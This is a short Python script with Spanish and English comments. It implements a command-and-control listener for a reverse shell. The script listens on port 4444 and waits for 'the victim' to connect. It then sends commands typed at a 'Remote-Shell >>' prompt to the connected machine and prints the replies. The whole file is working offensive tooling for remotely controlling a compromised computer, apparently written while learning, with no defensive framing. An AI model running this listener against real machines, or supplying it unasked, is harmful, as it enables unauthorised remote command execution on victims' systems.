import socket

# '0.0.0.0' significa "Escuchar en todas las interfaces de red de este PC"
HOST = '0.0.0.0' 
PORT = 4444

def init_server():
    print(f"\n[+] Configurando el Servidor C2 en el puerto {PORT}...")
    # Create a TCP Socket
    #AF_INET specifies IPv4
    #SOCK_STREAM specifies TCP
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1) # Listen for incoming connections (max 1 connection in the queue because of the argument number 1)
    print(f"[+] Servidor LISTO. Esperando a que la víctima se conecte...")

    client_sock, addr = server.accept() # Accept an incoming connection, is a blocking task, waits until someone connects
    # conn is the socket object to communicate with the client
    # addr is the address of the client
    print(f"\n[V] ¡CONEXIÓN ESTABLECIDA CON {addr[0]}!")
    print("-" * 50)

    while True:
        #SOlicitate command
        command = input("Remote-Shell >> ")
        #Sockets only send Bytes
        #encode tranforms the Strings into Byte
        if command.lower() == "exit":
            client_sock.send('exit'.encode())
            break
        
        if command.strip() == "":
            continue

        client_sock.send(command.encode())
        #Tranform the bytes into Utf-8 codification to understand in print
        response = client_sock.recv(4096).decode('utf-8',errors='ignore')

        print(response)
    
    client_sock.close()
    server.close()
    
if __name__ == '__main__':
    init_server()